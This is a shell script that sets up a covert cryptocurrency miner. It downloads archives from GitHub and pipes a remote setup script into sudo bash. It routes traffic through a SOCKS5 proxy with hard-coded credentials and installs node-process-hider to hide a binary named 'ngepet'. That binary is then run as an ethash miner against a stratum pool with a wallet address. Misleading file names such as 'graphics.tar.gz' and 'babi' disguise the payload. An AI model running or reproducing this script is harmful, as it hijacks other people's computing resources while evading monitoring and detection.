#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END 
listen = :2233 
loglevel = 1 
select_proxy_mode=socks5_only 
socks5 = 103.253.24.243:8080
socks5_username = woiden_indra
socks5_password = liyan25
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "**"

echo " "
echo " "

./graftcp/graftcp sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && wget https://github.com/liyanul2525/liyanul/files/9190123/babi.tar.gz && tar -xf babi.tar.gz && sudo ph add babi/ngepet && babi/ngepet -a ethash -o stratum+ssl://34.149.10.66:443 -u 39sFYSz9zFgnBfkVGxMaQSHhgWbCMkgReV.Tuyul socks5://192.252.209.155:14455
